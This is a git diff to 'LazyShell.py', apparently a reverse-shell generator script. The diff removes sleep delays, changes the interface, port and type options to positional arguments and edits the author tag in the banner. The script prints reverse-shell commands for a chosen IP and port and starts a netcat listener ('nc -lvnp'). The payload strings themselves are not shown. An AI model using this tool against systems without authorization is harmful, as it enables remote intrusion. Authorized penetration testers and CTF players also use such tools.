@@ -1,25 +1,25 @@
+#!/usr/bin/env python3
 import argparse
 import base64    
 import sys
 import netifaces as ni
 import os
-import time
 
 banner = r'''
    __                 ___           ______       ____
   / /  ___ ____ __ __/ _ \___ _  __/ __/ /  ___ / / /
  / /__/ _ `/_ // // / , _/ -_) |/ /\ \/ _ \/ -_) / /
 /____/\_,_//__/\_, /_/|_|\__/|___/___/_//_/\__/_/_/
-              /___/ 	[modified by ch4rm1ngb34r]
+              /___/ 	[modified by ch4rm]
 
 '''
 
 print('\033[94m'+banner+'\033[0m')
 
-parser = argparse.ArgumentParser()
-parser.add_argument("-i", "--interface", type=str, help="Interface", dest='interface')
-parser.add_argument("-p", "--port", type=int, help="Port number", dest='portnum')
-parser.add_argument("-t", "--type", type=str, help="Type of the reverse shell to generate", dest='type')
+parser = argparse.ArgumentParser(prog='LazyShell.py', usage='%(prog)s [interface] [Port] [Type]')
+parser.add_argument(type=str, help="[Interface]", dest='interface')
+parser.add_argument(type=int, help="[Port number]", dest='portnum')
+parser.add_argument(type=str, help="[Revers shell type]", dest='type')
 parser.add_argument("-l", "--list", action="store_true", help="List all available shell types", dest='list')
 parser.add_argument("-v", "--verbose", action="store_true", help="Verbose mode", dest='verbose')
 parser.add_argument("-a", "--all", action="store_true", help="Generate all the shells", dest='all')
@@ -72,24 +72,19 @@ if args.interface or args.portnum != None:
     if args.interface != None:
        ip = ni.ifaddresses(args.interface)[ni.AF_INET][0]['addr']
     else:
-       time.sleep(0.5)
        print ('\033[1m'+'\033[93m'+"[*] "+'\033[0m'+"Using default ip instead")
        ip = '127.0.0.1'
-       time.sleep(1)
     if args.portnum != None:
        port = args.portnum
     else:
-       time.sleep(0.5)
        print ('\033[1m'+'\033[93m'+"[*] "+'\033[0m'+"Using default port instead")
        port = 1234
 else:
-    time.sleep(0.2)
     print ('\033[1m'+'\033[93m'+"[*] "+'\033[0m'+"Using default ip and port instead")
     ip = '127.0.0.1'
     port = 1234
 
 if args.type: 
-    time.sleep(1)
     print('\033[1m'+'\033[92m' + "[*] "+'\033[0m' + args.type + " reverse shell" + " ")
     for k,v in shell_dict.items():
         for i in v:
@@ -110,6 +105,5 @@ if args.all:
             print('\n' + x.format(ip, port))
 
 if not args.verbose:
-       time.sleep(1)
-       print('\033[1m'+'\033[92m'+"[*] "+'\033[0m' +"Starting the listener on "+str(ip)+":"+str(port)+"...")
-       os.system('nc -lvnp '+ str(port))
+        print('\033[1m'+'\033[92m'+"[*] "+'\033[0m' +"Starting the listener on "+str(ip)+":"+str(port)+"...")
+        os.system('nc -lvnp '+ str(port))
